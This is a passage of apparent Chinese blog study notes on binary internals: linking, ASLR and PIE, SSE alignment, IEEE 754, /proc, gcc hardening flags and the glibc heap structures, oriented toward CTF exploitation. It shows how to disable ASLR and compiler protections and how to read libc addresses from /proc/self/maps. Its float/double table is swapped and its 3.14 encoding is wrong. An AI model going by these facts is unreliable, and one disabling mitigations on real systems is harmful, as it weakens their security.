 nopw   %cs:0x0(%rax,%rax,1)</span><br><span class="line"> 668:   00 00 00</span><br><span class="line"> 66b:   0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>目标文件需要链接一大堆文件才能得到最终的可执行文件（上面只展示了链接后的 main 函数，可以和 hello.o 中的 main 函数作对比）。链接过程主要包括地址和空间分配（Address and Storage Allocation）、符号决议（Symbol Resolution）和重定向（Relocation）等。</p><h2 id="linux程序执行流程"><a href="#linux程序执行流程" class="headerlink" title="linux程序执行流程"></a>linux程序执行流程</h2><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/hZ3KjroJWDPQBcl.png" alt=""></p><h2 id="ASLR与PIE"><a href="#ASLR与PIE" class="headerlink" title="ASLR与PIE"></a>ASLR与PIE</h2><p>总是混淆分不清,整理一下</p><div class="table-container"><table><thead><tr><th></th><th>作用位置</th><th>归属</th><th>作用时间</th></tr></thead><tbody><tr><td>ASLR</td><td>0:不开启<br/>1：栈基地址（stack）、共享库（.so\libraries）、mmap 基地址<br/>2：在 1 基础上，增加随机化堆基地址（chunk）</td><td>系统功能</td><td>作用于程序（ELF）装入内存运行时</td></tr><tr><td>PIE</td><td>代码段（ .text ）、初始化数据段（ .data ）、未初始化数据段（ .bss ）</td><td>编译器功能</td><td>作用于程序（ELF）编译过程中</td></tr></tbody></table></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">修改ASLR设置</span><br><span class="line">echo 0/1/2 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><h2 id="XMM寄存器"><a href="#XMM寄存器" class="headerlink" title="XMM寄存器"></a>XMM寄存器</h2><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><p>现代处理器还有一些扩展,这些扩展体现在电路上，指令集上，有时候也会扩展一些很有用的寄存器。</p><p>比较著名的扩展叫作 SSE (Streaming SIMD Extensions)，该扩展加入了新的 xmm 寄存器集合：</p><p><strong>xmm0，xmm1，…，xmm15</strong>。共16个寄存器,这些寄存器固定为 <strong>128 位宽</strong>，常用于两种任务：</p><ul><li>浮点数运算；</li><li>SIMD 指令集(这种指令一条指令可以操作多条数据)</li></ul><p>每个XMM寄存器都可以存储128位（16字节）的数据，并且可以用于执行一次性并行处理多个数据的操作，如浮点运算、图像处理和向量运算等。这使得XMM寄存器在执行高性能计算和多媒体应用程序时非常有用。</p><h3 id="内存对齐问题"><a href="#内存对齐问题" class="headerlink" title="内存对齐问题"></a>内存对齐问题</h3><p>先看操作xmm寄存器的四个指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">movaps和movups之间的区别在于对内存对齐的要求。movaps要求数据在内存中按照128位对齐，而movups可以处理未对齐的数据。</span><br><span class="line"></span><br><span class="line">movups：将128位数据从一个XMM寄存器或内存位置复制到另一个XMM寄存器或内存位置。与movaps不同，movups不要求数据在内存中按照128位对齐。</span><br><span class="line"></span><br><span class="line">movdqa：将128位数据从一个XMM寄存器或内存位置复制到另一个XMM寄存器或内存位置。与movaps类似，movdqa要求数据在内存中按照128位对齐。</span><br><span class="line"></span><br><span class="line">movdqu：类似于movups，它将128位数据从一个XMM寄存器或内存位置复制到另一个XMM寄存器或内存位置，但是对内存对齐没有特殊要求。它可以处理未对齐的数据，并且在某些情况下，可能会导致性能下降。</span><br></pre></td></tr></table></figure><p><strong>结论:movaps和movdqa要求内存对齐,而movups和movdqu不要求</strong></p><p>大多数 SSE 指令都需要内存操作数适当地进行对齐。上面说到的未对齐版本的指令和对齐版本的指令在助记符上就有差别，而且因为内存未对齐的关系，性能也会受影响。由于 SSE 指令经常被用在性能敏感的场合，所以始终使用操作数内存对齐版本的指令是明智之举。</p><h2 id="CISC和RISC"><a href="#CISC和RISC" class="headerlink" title="CISC和RISC"></a>CISC和RISC</h2><p>处理器有一种按照其指令集进行分类的方式。当设计一个处理器时有两个极端。</p><ul><li>设计出各种特化指令，高级指令。这种架构叫作 <strong>CISC (Complete Instruction Set Computer)</strong> 架构。</li><li>只使用一些基本指令，完成的架构叫 <strong>RISC (Reduced Instruction Set Computer)</strong> 架构。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">指令集复杂：CISC架构的指令集包含大量的复杂指令，可以执行更高级的操作，如内存访问、字符串处理、浮点运算等。这些指令通常具有多个操作数和复杂的寻址模式。</span><br><span class="line">指令多样性：CISC架构的指令集包含各种不同的指令，每个指令可以执行多个操作，甚至一个指令可以完成一系列操作。这使得编程更灵活，但也增加了硬件的复杂性。</span><br><span class="line">存储器访问：CISC架构通常允许直接访问内存，即指令可以直接操作内存中的数据，而不需要将数据加载到寄存器中。</span><br><span class="line">指令长度不统一：CISC指令长度可以不同，从几个字节到几十个字节不等，这使得指令解码复杂。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">简化指令集：RISC架构的指令集相对简化，指令数量较少且固定，每个指令执行的操作也更加简单和基本，如算术运算、逻辑运算等。</span><br><span class="line">指令统一性：RISC架构的指令长度一般是固定的，通常为两个字（32位）或一个字（16位），这简化了指令解码和处理器设计。</span><br><span class="line">寄存器优先：RISC架构鼓励使用寄存器操作，大多数操作都在寄存器上进行，减少了对内存的直接访问。</span><br><span class="line">流水线执行：RISC架构更注重流水线执行，指令之间的依赖关系较少，可以并行执行，提高了处理器的性能。</span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th>对比</th><th>CISC(X86)</th><th>RISC(ARM,MIPS,etc)</th></tr></thead><tbody><tr><td>访存模式</td><td>多种寻址模式</td><td>load/store</td></tr><tr><td>指令宽度</td><td>变长</td><td>定长</td></tr><tr><td>操作数来源</td><td>内存或寄存器</td><td>寄存器</td></tr><tr><td>IO通信</td><td>占用的IO指令和IO地址空间</td><td>内存映射</td></tr><tr><td>访存对齐</td><td>不需要</td><td>需要</td></tr><tr><td>数据类型</td><td>多而复杂</td><td>少而简洁</td></tr><tr><td>寄存器堆</td><td>相对更小</td><td>相对更大</td></tr><tr><td>设计原则</td><td>功能多样的复杂指令集</td><td>功能完备的精简指令集</td></tr></tbody></table></div><h2 id="浮点数在内存中的存储"><a href="#浮点数在内存中的存储" class="headerlink" title="浮点数在内存中的存储"></a>浮点数在内存中的存储</h2><p>在计算机中，浮点数表示方式采用了<strong>IEEE 754</strong>标准。IEEE 754定义了浮点数的二进制表示规范，它规定了浮点数的位数、指数位数、小数位数等。</p><div class="table-container"><table><thead><tr><th></th><th>符号位</th><th>指数位</th><th>小数位</th></tr></thead><tbody><tr><td>float</td><td>1位</td><td>11位(偏移1023)</td><td>52位</td></tr><tr><td>double</td><td>1位</td><td>8位(偏移127)</td><td>23位</td></tr></tbody></table></div><p>具体的存储方式为：</p><ol><li>符号位：用于表示浮点数的正负号，0表示正数，1表示负数。</li><li>指数位：用于表示浮点数的指数部分。采用”偏移量表示法”，即指数的实际值等于存储的值减去一个偏移量，这样可以使指数既有正数又有负数的表示范围。</li><li>小数位：用于表示浮点数的小数部分。</li></ol><p><strong>具体的转换过程如下：</strong></p><ol><li>将浮点数转换为二进制科学计数法：将浮点数表示为M乘以2的E次方的形式。<strong>其中M是一个大于等于1且小于2的小数（隐藏了最高位的1）</strong>，E是整数。</li><li>根据科学计数法，将M和E转换为二进制表示。</li><li>将符号位、指数位、和小数位组合在一起形成64位二进制数，即双精度浮点数的内存表示。</li></ol><p>举个例子，我们将<code>3.14</code>转换成双精度浮点数(double)的二进制表示：</p><ol><li><code>3.14</code>的二进制科学计数法为<code>1.570*2^1</code>，其中<code>1.570</code>是小数部分，<code>2^1</code>是2的1次方，即2。</li><li><code>1.570</code>的二进制表示是<code>1.1010001001100110011001100110011001100110011001101</code>。</li><li><code>2</code>的二进制表示是<code>10</code>。</li></ol><p>现在将符号位、指数位、和小数位组合在一起：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">符号位: 0 (表示正数)</span><br><span class="line">指数位: 1023 + 1 = 1024，对应的二进制表示是：`10000000000`</span><br><span class="line">小数位: `1010001001100110011001100110011001100110011001101`</span><br></pre></td></tr></table></figure><p>将它们放在一起：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 10000000000 1010001001100110011001100110011001100110011001101</span><br></pre></td></tr></table></figure><p><strong>NaN:</strong></p><p>在IEEE 754浮点数标准中，NaN（Not a Number）是一种特殊的浮点数表示，用于表示非法的或未定义的操作的结果。NaN不是一个具体的数字，而是一种特殊的标记。</p><p><code>01111111111  1111 1111 1111 1111 1111 1111 1111 1111</code></p><p>满足</p><div class="table-container"><table><thead><tr><th>Comparison</th><th>NaN ≥ <em>x</em></th><th>NaN ≤ <em>x</em></th><th>NaN &gt; <em>x</em></th><th>NaN &lt; <em>x</em></th><th>NaN = <em>x</em></th><th>NaN ≠ <em>x</em></th></tr></thead><tbody><tr><td>Result</td><td>False</td><td>False</td><td>False</td><td>False</td><td>False</td><td>True</td></tr></tbody></table></div><p>且NaN!=NaN是成立的</p><p><strong>小数转二进制</strong></p><p>例如，我们要将十进制数0.625转换为二进制表示：</p><ol><li>0.625的整数部分为0，保留小数部分。</li><li>将0.625乘以2，得到1.25。整数部分为1，保留小数部分0.25。</li><li>再将0.25乘以2，得到0.5。整数部分为0，保留小数部分0.5。</li><li>继续将0.5乘以2，得到1.0。整数部分为1，没有小数部分，结束。</li></ol><p>将每次得到的整数部分依次排列起来，就得到了0.625的二进制表示：0.101。</p><p>对于无限不循环小数（如π、e等），在计算机中是无法完全表示的，因为计算机的内存是有限的。因此，对于这些无限不循环小数，计算机只能使用有限的位数来表示，导致了一定的精度损失。</p><h2 id="四大常见架构"><a href="#四大常见架构" class="headerlink" title="四大常见架构"></a>四大常见架构</h2><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-09-05_153014.png" alt=""></p><ol><li><strong>x86 架构</strong>：<ul><li>最常见的处理器架构之一，由英特尔（Intel）和 AMD 公司开发和推广。</li><li>主要用于个人电脑和服务器领域。</li><li>典型的操作系统如Windows和Linux都支持x86架构。</li><li>x86处理器通常采用复杂指令集计算机（CISC）设计，具有广泛的软件兼容性。</li></ul></li><li><strong>ARM 架构</strong>：<ul><li>常见于移动设备、嵌入式系统和物联网设备中。</li><li>低功耗、高性能和节能的特性使其成为移动计算领域的主流。</li><li>ARM处理器通常采用精简指令集计算机（RISC）设计，具有出色的能效和性能平衡。</li></ul></li><li><p><strong>MIPS 架构</strong>：</p><ul><li>最初用于工作站和嵌入式系统。</li><li>具有良好的性能和可扩展性，适用于一些特定应用。</li><li>在某些嵌入式领域仍然有一定的存在。</li></ul></li><li><p><strong>RISC-V</strong></p><ul><li><p>RISC-V是一种开放标准的指令集架构（ISA），任何人都可以免费使用、实现和定制它，而不必支付专利费用。这使得RISC-V在开源和学术界广泛流行。</p></li><li><p>与传统的CISC架构（如x86）不同，RISC-V采用了精简指令集计算机（RISC）设计原则，使指令集更简单和统一，有助于提高性能和降低功耗。</p></li><li><p>RISC-V的设计非常模块化，可以根据需求自定义指令集，这使得它非常适合各种应用，从嵌入式系统到高性能计算。</p></li><li><p>RISC-V可用于各种应用领域，包括嵌入式系统、物联网设备、移动设备、服务器、超级计算机等。</p></li></ul></li><li><p><strong>Power 架构</strong>：</p><ul><li>最初由IBM开发，用于高性能计算和服务器领域。</li><li>具有强大的多核和多线程性能，广泛应用于超级计算机和高性能计算集群。</li></ul></li></ol><h2 id="数据编码"><a href="#数据编码" class="headerlink" title="数据编码"></a>数据编码</h2><h2 id="linux-proc目录"><a href="#linux-proc目录" class="headerlink" title="linux-proc目录"></a>linux-proc目录</h2><p>在Linux系统中，/proc目录是一个虚拟文件系统，用于提供有关当前运行中的内核和系统状态的信息。它不包含实际的文件，而是包含一组伪文件和子目录，这些文件和目录提供了有关系统内核、进程、硬件和其他系统信息的实时视图。</p><p>以下是/proc目录的一些常见用途和子目录：</p><ol><li><strong>/proc/cpuinfo</strong>: 包含有关CPU的信息，如制造商、型号、时钟频率等。</li><li><strong>/proc/meminfo</strong>: 提供系统内存使用的信息，包括总内存、可用内存、缓存等。</li><li><strong>/proc/sys</strong>: 包含用于配置内核参数的文件。可以通过这些文件来动态更改内核的某些行为。</li><li><strong>/proc/<PID></strong>: 每个正在运行的进程都有一个以其进程ID（PID）命名的子目录，其中包含有关该进程的信息，如命令行参数、状态、打开的文件描述符等。</li><li><strong>/proc/net</strong>: 包含有关网络协议、接口和连接的信息。</li><li><strong>/proc/loadavg</strong>: 提供系统的负载平均值，以及最近1分钟、5分钟和15分钟的负载平均值。</li><li><strong>/proc/filesystems</strong>: 列出支持的文件系统类型。</li><li><strong>/proc/interrupts</strong>: 显示当前系统上的中断分配情况，可以用于监视硬件中断的使用情况。</li><li><strong>/proc/mounts</strong>: 列出当前已挂载的文件系统。</li><li><strong>/proc/sys/kernel</strong>: 包含与内核相关的参数，如主机名、域名、内核版本等。</li><li><strong>/proc/sys/fs</strong>: 包含与文件系统相关的参数，如文件句柄限制等。</li></ol><p>这些信息对于系统管理、性能调优和故障排除非常有用，管理员和开发人员可以通过读取/proc目录中的文件来了解系统的运行状况和性能指标。需要注意的是，/proc目录中的信息是动态的，可以在运行时获取，因此可以用于实时监控系统状态。</p><p><strong>其中</strong></p><p>进程的内存信息都会存储于/proc/pid/maps中，</p><p>如果不知道pid,这里pid可以使用self来代替，就能获取本进程libc的地址了。</p><h2 id="函数指针与函数变量"><a href="#函数指针与函数变量" class="headerlink" title="函数指针与函数变量"></a>函数指针与函数变量</h2><h3 id="函数变量："><a href="#函数变量：" class="headerlink" title="函数变量："></a>函数变量：</h3><ol><li>函数变量的定义和使用：<ul><li>函数变量实际上是一个函数名，可以用来表示一个函数。</li><li>当你使用函数变量时，实际上是在引用函数本身，而不是函数的地址。</li><li>函数变量在被调用时，会直接执行函数体中的代码。</li></ul></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">myFunction</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Value passed: %d\n&quot;</span>, x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 函数变量的使用</span></span><br><span class="line">    <span class="type">void</span> (*functionVar)(<span class="type">int</span>) = myFunction;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 直接调用函数变量</span></span><br><span class="line">    functionVar(<span class="number">42</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="函数指针："><a href="#函数指针：" class="headerlink" title="函数指针："></a>函数指针：</h3><ol><li>函数指针的定义和使用：<ul><li>函数指针是一个指向函数的指针，它存储函数的地址而不是函数本身。</li><li>使用函数指针时，需要通过解引用来调用函数。</li></ul></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">myFunction</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Value passed: %d\n&quot;</span>, x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 函数指针的定义</span></span><br><span class="line">    <span class="type">void</span> (*functionPtr)(<span class="type">int</span>);</span><br><span class="line">    <span class="comment">// 函数指针的初始化</span></span><br><span class="line">    functionPtr = myFunction;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过函数指针调用函数</span></span><br><span class="line">    (*functionPtr)(<span class="number">42</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="主要异同："><a href="#主要异同：" class="headerlink" title="主要异同："></a>主要异同：</h3><ol><li><strong>声明方式：</strong><ul><li>可以看到二者的声明方式是完全一致的,而到底是将其作为函数指针还是函数变量也是由用户决定的,毕竟二者<strong>在汇编层面都是一致的</strong></li></ul></li><li><strong>调用方式：</strong><ul><li>函数变量直接使用变量名调用函数。</li><li>函数指针需要通过解引用来调用函数。</li></ul></li><li><strong>用途：</strong><ul><li>函数变量主要用于简化代码，使得可以通过一个变量名引用一个函数。</li><li>函数指针通常用于传递函数作为参数给其他函数，以及实现一些高级的动态调用机制。</li></ul></li></ol><p>总的来说，函数变量更像是一个别名，而函数指针则更侧重于存储和传递函数的地址，提供了更灵活的方式来处理函数。</p><h2 id="编译保护选项"><a href="#编译保护选项" class="headerlink" title="编译保护选项"></a>编译保护选项</h2><div class="table-container"><table><thead><tr><th>安全技术</th><th>完全开启</th><th>部分开启</th><th>关闭</th></tr></thead><tbody><tr><td>Canary</td><td>-fstack-protector-all</td><td>-fstack-protector</td><td>-fno-stack-protector</td></tr><tr><td>NX</td><td>-z noexecstack</td><td></td><td>-z execstack</td></tr><tr><td>PIE</td><td>-pie</td><td></td><td>-no-pie</td></tr><tr><td>RELRO</td><td>-z now</td><td>-z lazy</td><td>-z norelro</td></tr></tbody></table></div>]]></content>
      
      
      <categories>
          
          <category> 杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习记录 </tag>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆学习笔记</title>
      <link href="/posts/8932/"/>
      <url>/posts/8932/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>堆的学习可以说是一道坎了，要掌握的话对源码阅读及理解的能力要求挺高，初学时往往被搞得晕头转向，这里就记录一下我的学习记录，基础的东西到处都有就不记了，主要还是记一些我认为比较重要或者容易被忽略的细节。</p><hr><h1 id="学习记录"><a href="#学习记录" class="headerlink" title="学习记录"></a>学习记录</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>基础的东西网上能搜到的教程(像ctfwiki,狼组安全,ctf-all-in-one等)讲的已经很细了，认真看一定能有一个基础的知识框架.不过还是推荐看一看华庭大佬的<a href="https://pan.baidu.com/s/167Z3CHDEeP1dl3c2Ii0lXg?pwd=1234">glibc内存管理-ptmalloc2源码分析</a>(很细很全很直白),看了之后真的能有很多收获.</p><h2 id="理清从属关系"><a href="#理清从属关系" class="headerlink" title="理清从属关系"></a>理清从属关系</h2><p>初学时,heap,arena,chunk这些东西很容易把人搞糊涂,这里简单梳理一下</p><p>系统中整个堆功能的实现区域都可以被叫做堆(heap),但其实但heap还有一个相对这个整个堆区域要更小的概念,如下:</p><p>glibc的malloc源码中涉及三种最重要数据结构：<strong>Arena、Heap、Chunk</strong> ，分别对应结构体<strong>malloc_state、heap_info、malloc_chunk 。</strong>每个数据结构都有对应的结构体实现,如图:</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-16_095156.png" alt=""></p><ul><li><strong>Thread - Arena</strong> ： 一个Arena对应多个线程Thread。即每个线程都有一个Arena，但是有可能多个线程共用一个Arena(同一时间只能一对一)。每个Arena都包含一个malloc_state结构体，保存bins, top chunk, Last reminder chunk等信息。</li><li><strong>Arena - Heap</strong>：一个Arena可能拥有多个heap。Arena开始的时候只有一个heap，但是当这个heap的空间用尽时，就需要获取新的heap。(也可以理解为subheap子堆)</li><li><strong>Heap - Chunk</strong>：一个Heap根据用户的请求会划分为多个chunk，每个chunk拥有自己的header - malloc_chunk。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-18_161600.png" alt=""></p><p>需要注意的是，<em>Main Arena只有一个heap，因此没有heap_info结构</em>。当main arena用尽空间后，会扩展当前的heap空间。此外，Main Arean的Arena header并不是heap segment的一部分，而作为全局变量储存在libc.so的数据段中。</p><p>下图是只有一个heap时，主线程和线程的堆结构示意图，左图是Main Arena，右图是Threa Arena。堆是从低地址向高地址增长的，可以看到每一个malloc_chunk上面都跟着一个chunk。同时Main Arena没有heap_info和malloc_state的结构。 </p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-16_095630.png" alt=""></p><p>下图是存在多个heap的thread Arena的情况。可以看到每一个heap都一个heap header（heap_info），但是只有最初的heap拥有arena header(malloc_state).</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-16_095644.png" alt="graph"></p><p>当线程申请内存时，就创建一个Arena。主线程有自己独立的Arena，叫做main arena，但不是每一个线程都有独立的Arena。</p><p>Arena的个数取决于cpu核的个数</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-17_204838.png" alt=""></p><h2 id="三个重要结构体的定义"><a href="#三个重要结构体的定义" class="headerlink" title="三个重要结构体的定义"></a>三个重要结构体的定义</h2><h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  __libc_lock_define (, mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span></span><br><span class="line">  <span class="comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span></span><br><span class="line">  <span class="type">int</span> have_fastchunks;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  mstate ar_ptr; <span class="comment">/* Arena for this heap. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span> *<span class="title">prev</span>;</span> <span class="comment">/* Previous heap. */</span></span><br><span class="line">  <span class="type">size_t</span> size;   <span class="comment">/* Current size in bytes. */</span></span><br><span class="line">  <span class="type">size_t</span> mprotect_size; <span class="comment">/* Size in bytes that has been mprotected</span></span><br><span class="line"><span class="comment">                           PROT_READ|PROT_WRITE.  */</span></span><br><span class="line">  <span class="comment">/* Make sure the following data is properly aligned, particularly</span></span><br><span class="line"><span class="comment">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span></span><br><span class="line"><span class="comment">     MALLOC_ALIGNMENT. */</span></span><br><span class="line">  <span class="type">char</span> pad[<span class="number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</span><br><span class="line">&#125; heap_info;</span><br></pre></td></tr></table></figure><h2 id="malloc和free的流程"><a href="#malloc和free的流程" class="headerlink" title="malloc和free的流程"></a>malloc和free的流程</h2><h3 id="malloc流程"><a href="#malloc流程" class="headerlink" title="malloc流程"></a>malloc流程</h3><hr><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/1678786338164.png" 